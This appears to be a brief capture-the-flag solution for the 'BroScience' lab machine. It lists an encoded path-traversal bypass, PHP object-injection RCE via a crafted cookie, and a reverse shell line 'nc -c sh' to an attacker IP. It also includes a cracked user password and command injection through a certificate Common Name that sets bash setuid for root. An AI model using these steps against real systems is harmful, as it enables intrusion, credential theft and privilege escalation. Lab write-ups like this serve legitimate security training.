### Solver
```
parameter ?path vuln LFI
bypassing using ..%252f
found includes/
read ..%252fincludes%252futils.php, we know how activation code generated
read ..%252fregister.php we know how to activate https://broscience.htb/activate.php?code={$activation_code}
create automation w/ python to register and print the time
recode the activation code with known time as seed
if activation code is invalid, bruteforce the seed with range known time
got activation code, activate the account, and log in
after login, check cookies, user-prefs as new cookies has been set
PHP Object Injection in Class AvatarInterface & Class Avatar, file_get_contents trigger RCE on shell file
create shell file in local
generate serialize cookie
change user prefs cookie to new serialize cookie with exploit
access broscience.htb/shell_file.php
got RCE nc -c sh 10.10.16.3 1234
from file users.php we know there is a tables named users from broscience databases
dump table using PHP file and got hash password bill user 13edad4932da9dbb57d9cd15b66ed104:NaCl
found password cracked iluvhorsesandgym
run pspy to monitor process
found process /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
create new cert but will expire soon name broscience.crt symlink to /bin/bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.crt -days 1 -out broscience.crt

Country Name (2 letter code) [AU]:AT
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:Vienna
Organization Name (eg, company) [Internet Widgits Pty Ltd]:BroScience
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)
Email Address []:administrator@broscience.htb

/bin/bash -p
got root

```
